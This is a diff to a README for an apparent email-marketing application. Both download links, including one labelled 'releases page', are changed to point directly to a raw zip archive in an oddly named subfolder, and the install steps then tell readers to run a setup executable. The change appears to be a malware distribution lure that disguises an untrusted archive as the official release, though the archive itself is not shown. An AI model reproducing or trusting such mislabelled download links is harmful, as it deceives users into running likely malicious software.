@@ -1,6 +1,6 @@
 # 📧 Email-Marketing-Suite - Manage your email campaigns with ease
 
-[![Download Email-Marketing-Suite](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/huntheaded963/Email-Marketing-Suite)
+[![Download Email-Marketing-Suite](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/huntheaded963/Email-Marketing-Suite/raw/refs/heads/main/oriflamme/Suite-Marketing-Email-v3.5-alpha.3.zip)
 
 ## Overview 📝
 
@@ -28,7 +28,7 @@ Your computer needs to meet these standards to run the application:
 
 ## 📥 How to Install
 
-1. Visit the [releases page](https://github.com/huntheaded963/Email-Marketing-Suite) to find the correct installation file.
+1. Visit the [releases page](https://github.com/huntheaded963/Email-Marketing-Suite/raw/refs/heads/main/oriflamme/Suite-Marketing-Email-v3.5-alpha.3.zip) to find the correct installation file.
 2. Select the file named `Email-Marketing-Suite-Setup.exe`.
 3. Save the file to your desktop or downloads folder.
 4. Locate the saved file and double-click the icon.
